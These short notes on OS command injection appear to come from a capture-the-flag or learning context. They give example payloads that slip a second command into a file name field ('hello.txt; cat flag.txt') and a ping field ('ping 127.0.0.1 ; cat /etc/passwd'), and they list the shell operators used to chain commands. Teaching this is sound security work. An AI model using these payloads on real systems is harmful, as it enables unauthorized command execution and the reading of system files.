
### Examples

hash the file:
`hello.txt; cat flag.txt`
gave the first hashed and the second in clear text

ping web interface
ping server ip:
`ping 127.0.0.1 ; cat /etc/passwd`


; && || can be used to separate/chain commands
- `command1 && command2` that will run `command2` if `command1` succeeds
- `command1 || command2` that will run `command2` if `command1` fails
- `command1 ; command2` that will run `command1` then `command2`
- `command1 | command2` that will run `command1` and send the output of `command1` to `command2`

